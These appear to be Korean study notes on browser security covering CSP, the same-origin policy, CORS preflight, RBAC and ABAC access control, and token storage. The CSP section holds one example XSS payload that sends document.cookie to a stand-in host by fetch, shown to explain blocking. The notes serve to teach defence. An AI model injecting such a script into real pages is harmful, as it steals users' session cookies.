서버에서 CSP를 적용하려면 브라우저에게 `Content-Security-Policy`라는 헤더를 내려주어야 합니다.

- **Express.js 코드 예시:**JavaScript
    
    `app.use((req, res, next) => {
      res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' https://trusted.com;"
      );
      next();
    });`
    
    이처럼 응답 헤더에 정책을 담아 보내면, 브라우저는 이 규칙을 읽고 해당 페이지에서 허용되지 않은 리소스 실행을 원천 차단합니다.

    이 설정은 "기본적으로 모든 리소스는 '나'와 같은 출처에서만 가져오겠다"는 가장 강력한 기본 원칙입니다.

- **의미:** 스크립트, 이미지, 스타일시트 등 구체적인 지시자가 없는 모든 리소스에 적용되는 기본값입니다.
- **포함하는 것:** 현재 페이지와 **도메인, 프로토콜(http/https), 포트**가 정확히 일치하는 출처만 허용합니다.
- **제외하는 것:** 다른 도메인은 물론, 같은 도메인이라도 `http`에서 `https`로의 요청이나 다른 포트 번호의 요청은 모두 제외합니다.

악의적인 사용자가 `<script>fetch('https://hacker.com/steal?data=' + document.cookie)</script>` 같은 코드를 심었을 때의 동작입니다.

- **네트워크 탭:** 해당 `fetch` 요청 자체가 **(canceled)** 또는 **(blocked)** 상태로 뜨며, 실제로 외부 서버로 데이터가 전송되지 않습니다.
- **콘솔 메시지:** 빨간색 에러와 함께 `"Refused to execute inline script because it violates the following Content Security Policy directive..."`라는 경고가 뜹니다. 정책 위반으로 인해 실행이 거부되었다는 메시지입니다.

기본적인 CSP 설정은 Inline Style(`style="..."`)이나 **Inline Script**를 기본적으로 차단합니다.

- **이유:** 해커가 HTML 코드 사이에 몰래 스타일이나 스크립트를 끼워 넣는 행위(XSS)를 원천 봉쇄하기 위함입니다.
- **해결책:** 디자인을 적용하려면 외부 `.css` 파일을 불러오거나, CSP 설정에 `'unsafe-inline'`을 추가해야 하지만 보안상 권장되지 않습니다.

외부 API나 맵 서비스가 차단되는 현상은 건물의 '출입 통제 시스템'에 비유할 수 있습니다.

> **비유:** 건물의 보안을 강화해서 **"등록된 사원증을 가진 사람('self')"** 외에는 아무도 못 들어오게 막은 상황입니다. 이때 구글 애널리틱스나 카카오맵은 "유명하고 믿을 만한 외부 손님"이지만, 미리 "방문 예약 명단(CSP 허용 리스트)"에 올려두지 않았기 때문에 보안 요원(브라우저)이 입구를 막아버리는 것과 같습니다.
>
`Content-Security-Policy-Report-Only` 헤더를 사용할 때의 동작입니다.

- **브라우저:** 리소스를 차단하지 않고 **정상적으로 실행**합니다. 다만, 정책에 위반되는 요소가 있다면 콘솔에 경고를 띄웁니다.
- **서버:** 헤더에 `report-uri`가 설정되어 있다면, 브라우저는 위반 리포트(JSON 형식)를 해당 주소로 **자동 전송**합니다. 개발자는 서비스를 멈추지 않고 보안 구멍을 모니터링할 수 있습니다.

CSP는 XSS를 막는 데 탁월하지만, 요청 위조인 CSRF를 막으려면 다른 도구가 필요합니다.

1. **SameSite 쿠키 설정:** 쿠키를 설정할 때 `SameSite=Lax` 또는 `Strict` 옵션을 주어, 다른 사이트에서 발생한 요청에는 쿠키가 자동으로 포함되지 않게 막습니다.
2. **X-Frame-Options:** 내 사이트를 다른 사이트의 `<iframe>` 안에 넣지 못하게 막아, 사용자가 속아서 버튼을 누르게 만드는 '클릭재킹' 공격을 방지합니다


- 출처(Origin)는 어떤 세 요소의 조합으로 결정되나요?
    
    출처는 다음 세 가지 정보가 모두 일치해야 "동일 출처"로 인정받습니다.
    
    - **Protocol** (예: http, https)
    - **Host** (예: aido.kr, google.com)
    - **Port** (예: 80, 443, 3000)
- 출처의 요소가 다른 경우(예: 프로토콜만, 포트만 다른 경우)에 같은 출처인지 아닌지를 예시 3개(같은 출처 1개, 다른 출처 2개)로 설명하세요.
    
    기준 URL: `https://aido.kr:443` (기본 포트 443 생략 가능)
    
    | **예시 URL** | **판정** | **이유** |
    | --- | --- | --- |
    | `https://aido.kr/todos` | **Same Origin** | 프로토콜, 호스트, 포트가 모두 일치함 (경로만 다름) |
    | `http://aido.kr` | **Cross Origin** | **프로토콜**이 다름 (https vs http) |
    | `https://api.aido.kr` | **Cross Origin** | **호스트**가 다름 (서브도메인 `api`가 붙음) |
- 블로그에 나온 `fetch` 기반 악성 스크립트를 다른 출처로 실행했을 때 브라우저에서 어떤 일이 발생하나요? 네트워크 전송 여부, 응답 사용 가능성, 브라우저 콘솔 메시지 측면에서 서술하세요.
    
    브라우저는 보안을 위해 다음과 같이 동작합니다.
    
    - **네트워크 전송 여부:** 요청 자체는 서버로 **전송됩니다.** (서버는 요청을 받고 처리함)
    - **응답 사용 가능성:** 서버가 응답을 보내더라도, 브라우저가 SOP 위반을 감지하여 **자바스크립트(코드)가 응답 데이터에 접근하지 못하게 차단**합니다.
    - **콘솔 메시지:** "Access to fetch at '...' from origin '...' has been blocked by SOP/CORS policy"와 같은 빨간색 에러 메시지가 출력됩니다.
- SOP가 어떻게 Session Hijacking(세션 하이재킹) 시도를 방지하는지 구체적으로 설명하세요. SOP가 차단하는 것과 허용되는 것(예: 네트워크 요청은 나가지만 응답 데이터에 접근 불가)을 포함하세요.
    
    해커가 만든 사이트(`hacker.com`)에서 사용자의 은행 사이트(`bank.com`)로 몰래 `fetch` 요청을 보낸다고 가정해 봅시다.
    
    - **허용되는 것:** 브라우저는 `bank.com`으로 요청을 보낼 때 해당 사이트의 쿠키(세션 정보)를 자동으로 실어 보냅니다. (요청은 나감)
    - **차단하는 것:** 하지만 SOP 덕분에 해커의 자바스크립트는 `bank.com`에서 돌아온 **응답(계좌 잔액, 개인정보 등)을 읽을 수 없습니다.** * **결과:** 해커는 요청만 보낼 수 있을 뿐, 실질적인 데이터를 탈취하거나 세션 정보를 가로채서 활용하는 것이 불가능해집니다.
- 블로그에서 명시한 대로 SOP가 반드시 동일 출처에서만 접근하도록 하는 주요 브라우저 API/리소스 3가지를 쓰고, 각각에 대해 간단한 설명(왜 제한되는지)을 덧붙이세요.
    1. **XMLHttpRequest / Fetch API:** 다른 출처의 데이터를 읽어오는 것을 제한하여 데이터 유출을 방지합니다.
    2. **DOM (Document Object Model):** `<iframe>` 등으로 불러온 다른 사이트의 내부 요소(입력창, 버튼 등)에 접근하거나 조작하는 것을 막습니다.
    3. **Web Storage (LocalStorage / Cookie):** 다른 사이트에서 저장한 민감한 정보를 읽거나 수정하지 못하게 격리합니다.
    
    ### 
    
- SOP와 CSP의 차이를 블로그 내용에 따라 요점 4개(각 항목 1문장)로 정리하세요. (예: 누가 적용하는가, 제어 주체, 설정 가능 여부 등)
    - **기본 정책:** SOP는 브라우저가 기본으로 탑재한 강제 보안 규칙이고, CSP는 개발자가 추가로 선언하는 선택적 정책입니다.
    - **제어 주체:** SOP는 브라우저 엔진이 리소스를 격리하지만, CSP는 서버가 헤더를 통해 브라우저의 동작을 제어합니다.
    - **유연성:** SOP는 출처가 다르면 무조건 차단하는 보수적인 방식인 반면, CSP는 허용할 출처를 세밀하게 화이트리스트로 관리할 수 있습니다.
    - **방어 목적:** SOP는 주로 출처 간 데이터 탈취를 막고, CSP는 악성 스크립트 실행(XSS) 자체를 방지하는 데 특화되어 있습니다.
- 브라우저에서 SOP 관련 차단 오류를 발견했을 때(예: 콘솔에 “동일 출처 정책으로 인해 ... 차단했습니다” 메시지) 문제 원인 파악을 위한 체크리스트(최소 3항목)를 작성하고, 임시·영구 대응 방안(각 1~2줄)도 제시하세요.
    
    **체크리스트:**
    
    - [ ]  요청을 보내는 곳과 받는 곳의 **프로토콜**(http/https)이 일치하는가?
    - [ ]  서브도메인을 포함한 **호스트** 명칭이 정확히 일치하는가?
    - [ ]  API 서버의 **포트 번호**가 클라이언트와 동일하거나 허용되어 있는가?
    
    **대응 방안:**
    
    - **임시 대응:** 개발 환경에서 브라우저의 보안 정책을 끄고 실행하거나, 프록시(Proxy) 설정을 통해 같은 출처인 것처럼 속여서 테스트합니다.
    - **영구 대응:** 서버 측에서 **CORS(Cross-Origin Resource Sharing)** 헤더를 설정하여, 특정 출처(Origin)의 접근을 공식적으로 허용해 줍니다.


    - 브라우저에서 `http://localhost:8080` 애플리케이션이 `http://localhost:8081/resource.json`을 요청했을 때, 네트워크 요청과 응답은 어떻게 처리되며, 브라우저가 응답 본문을 사용하지 못하는 이유는 무엇인가요?
    - **네트워크 처리:** 브라우저는 출처가 다르더라도 일단 서버로 요청을 **전송**하고 서버로부터 응답(데이터)을 **수신**합니다. 즉, 네트워크 통신 자체는 성공적으로 일어납니다.
    - **차단 이유:** 응답을 받은 **브라우저**가 서버의 응답 헤더를 확인합니다. 헤더에 `Access-Control-Allow-Origin` 정보가 없거나 요청 출처(`localhost:8080`)와 일치하지 않으면, 보안을 위해 받은 데이터를 **자바스크립트 엔진에 전달하지 않고 파기**합니다. 그래서 우리 코드에서는 데이터를 사용할 수 없게 됩니다.
- 서버가 다른 출처(`http://localhost:8080`)에서 자원을 사용할 수 있게 하려면 어떤 응답 헤더를 어떻게 설정해야 하나요? 글의 예시 코드를 참고해 헤더 이름과 값까지 구체적으로 쓰세요.
    
    서버가 `http://localhost:8080` 출처를 허용하려면 다음과 같이 응답 헤더를 설정해야 합니다.
    
    - **헤더 이름:** `Access-Control-Allow-Origin`
    - **설정 값:** `http://localhost:8080` (또는 모든 출처 허용 시 )
    - **Express.js 예시:**
        
        `res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');`
        
- 단순 요청으로 분류되기 위해서는 어떤 두 가지 조건을 만족해야 하나요? 또한 `GET /resource.json` 요청이 단순 요청에 해당하는 이유를 설명하세요.
    1. **메서드:** `GET`, `HEAD`, `POST` 중 하나여야 합니다.
    2. **헤더:** `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` 등 기본적인 헤더만 사용해야 하며, `Content-Type`은 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`만 허용됩니다.
    - **GET /resource.json이 단순 요청인 이유:** `GET` 메서드를 사용하며, 별도의 커스텀 헤더를 추가하지 않는 한 위 조건들을 모두 만족하기 때문에 사전 요청(Preflight) 없이 바로 본 요청이 날아갑니다.

- 브라우저에서 `X-Goguma`라는 커스텀 헤더를 추가했을 때 왜 차단이 발생하나요? 이 문제를 해결하기 위해 서버에서 추가해야 하는 응답 헤더와 값은 무엇인가요?
    - **차단 이유:** `X-Goguma`는 브라우저가 정의한 '기본 헤더'가 아닙니다. 브라우저는 안전하지 않은 요청으로 판단하여 Preflight(사전 요청)을 보내는데, 서버가 이 헤더를 허용한다고 명시하지 않으면 요청을 차단합니다.
    - **해결 방법:** 서버의 응답 헤더에 다음을 추가해야 합니다.
        - **헤더 이름:** `Access-Control-Allow-Headers`
        - **설정 값:** `X-Goguma`
- `PUT` 요청을 보낼 때 브라우저는 왜 먼저 `OPTIONS` 요청을 보내나요? 이때 브라우저가 보내는 헤더와 서버가 응답해야 하는 헤더를 각각 쓰고, 사전 요청과 실제 요청이 어떻게 이어지는지 간단히 서술하세요.
    - **왜 OPTIONS를 보내나?:** `PUT`은 서버의 데이터를 수정하는 '위험한' 요청일 수 있습니다. 따라서 실제 요청을 보내기 전, 서버가 해당 출처와 메서드를 허용하는지 **미리 확인**하여 서버를 보호하기 위해 `OPTIONS` 요청을 보냅니다.
    
    **헤더 정보:**
    
    - **브라우저 전송 헤더:** * `Origin: http://localhost:8080` (나 어디서 왔어)
        - `Access-Control-Request-Method: PUT` (나 이거 해도 돼?)
    - **서버 응답 헤더:**
        - `Access-Control-Allow-Origin: http://localhost:8080`
        - `Access-Control-Allow-Methods: GET, POST, PUT`
    
    **진행 순서:**
    
    1. **Preflight**: 브라우저가 `OPTIONS` 요청을 보내 서버의 허락을 구합니다.
    2. **검증**: 서버가 허용 헤더를 담아 응답하면 브라우저가 이를 확인합니다.
    3. **Actual Request**: 허락이 떨어지면 그제야 브라우저가 진짜 `PUT` 요청을 서버에 보냅니다.

    - **RBAC**의 한계에 대해 설명해주세요.
    - **역할 폭발(Role Explosion):** "팀장" 역할만으로 부족해져서 "인천지사-마케팅팀-팀장-A프로젝트담당"처럼 아주 세부적인 역할이 계속 생겨나 관리가 불가능해집니다.
    - **유연성 부족:** "본인이 작성한 글만 수정 가능" 같은 동적인 조건을 넣기가 어렵습니다. RBAC에서는 이걸 해결하려면 "작성자"라는 역할을 또 만들어야 하죠.
    - **복잡한 상속 구조:** 역할 간의 계층이 깊어질수록 어떤 유저가 최종적으로 어떤 권한을 가졌는지 파악하기 매우 힘들어집니다.
- **ABAC**으로의 전환, 어떤 '기준'이 적절할까요?
    
    단순히 "복잡하니까 바꾼다"기보다, 저는 "조건의 가변성"을 기준으로 삼을 것 같습니다.
    
    - **동적 조건이 필요한가?**: 시간(오전 9시~오후 6시만 접근), 장소(사내 IP만 접근), 소유권(내가 만든 데이터인가) 등 상황에 따라 권한이 변해야 한다면 ABAC이 정답입니다.
    - **다중 속성 조합이 필요한가?**: "직무 + 직급 + 프로젝트 참여 여부" 등 여러 조건이 동시에 맞아야 할 때, 이걸 RBAC으로 다 만들려면 너무 힘드니 ABAC으로 전환하는 것이 적절한 기준이 됩니다.
- 어떤 서비스 영역에 **RBAC**을 남겨두고, **ABAC**을 도입하시겠어요?
    
    모든 곳을 ABAC으로 바꾸면 오히려 시스템이 너무 무거워질 수 있습니다. 그래서 저는 **'하이브리드'** 방식을 제안합니다.
    
    - **RBAC 유지 (거시적 권한):** "관리자냐 일반 사용자냐" 같은 아주 큰 단위의 서비스 진입 권한은 RBAC으로 유지합니다. (예: 어드민 페이지 접속 가능 여부)
    - **ABAC 도입 (미시적 권한):** 실제 데이터에 접근하는 세부 액션에 도입합니다. (예: "A 팀장님은 본인 팀원이 작성한 보고서 중 '승인 대기' 상태인 것만 조회 가능하다")

로컬 브라우저 보안 해제

| 저장소 | XSS에 안전? | CSRF에 안전? | 새로고침 후 유지? | 적합도 |
| --- | --- | --- | --- | --- |
| `localStorage` | 위험 | 안전 | 유지 | 보통 |
| `httpOnly Cookie` | 안전 | 위험 | 유지 | 높음 |
| JavaScript 변수 (메모리) | 안전 | 안전 | 사라짐 | 낮음 |
- **localStorage**: `localStorage.getItem()` 한 줄이면 토큰이 바로 털립니다. 악성 광고나 게시글을 통해 스크립트가 실행되는 **XSS 공격에 가장 취약**합니다.
- **httpOnly Cookie**: `httpOnly` 옵션을 걸면 자바스크립트가 아예 읽을 수 없어 XSS에는 무적입니다. 하지만 브라우저가 알아서 서버로 쿠키를 실어 보내는 특성 때문에, 가짜 사이트에서 요청을 보내는 **CSRF 공격에는 취약**합니다. (단, 서버에서 `SameSite` 설정을 통해 방어 가능합니다.)
- **JS 변수 (메모리)**: 새로고침만 하면 로그인이 풀려버리는 치명적인 단점이 있습니다. 사용자 경험(UX) 측면에서 최악이다.

대처 방안 

- **Access Token**: 보안을 위해 JS 변수(메모리)나 **Private 상태값**에 저장합니다. (XSS 방어)
- **Refresh Token**: 유효기간이 길기 때문에 **httpOnly + Secure Cookie**에 저장합니다. (XSS 방어 + 새로고침 시 토큰 갱신용)
